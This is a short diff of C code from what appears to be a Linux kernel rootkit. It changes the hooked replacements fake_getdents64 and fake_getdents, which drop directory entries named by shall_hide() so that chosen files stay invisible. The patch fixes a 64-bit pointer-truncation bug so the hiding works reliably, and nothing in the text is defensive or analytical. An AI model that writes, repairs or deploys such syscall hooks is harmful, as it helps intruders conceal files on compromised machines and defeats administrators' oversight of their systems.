@@ -85,7 +85,7 @@ asmlinkage int fake_getdents64( unsigned int fd,
       int err;
       int reclen = cur->d_reclen;
       char *next_rec = (char*)cur + reclen;
-      int len = (int)dirp + ret - (int)next_rec;
+      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
       char *remaining_dirents = kmalloc(len, GFP_KERNEL);
 
       // modify the memory storing the returned information
@@ -123,7 +123,7 @@ asmlinkage int fake_getdents(  unsigned int fd,
     if (shall_hide(cur->d_name)) {
       int reclen = cur->d_reclen;
       char* next_rec = (char*)cur + reclen;
-      int len = (int)dirp + ret - (int)next_rec;
+      uintptr_t len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;
       memmove(cur, next_rec, len);
       ret -= reclen;
       continue;
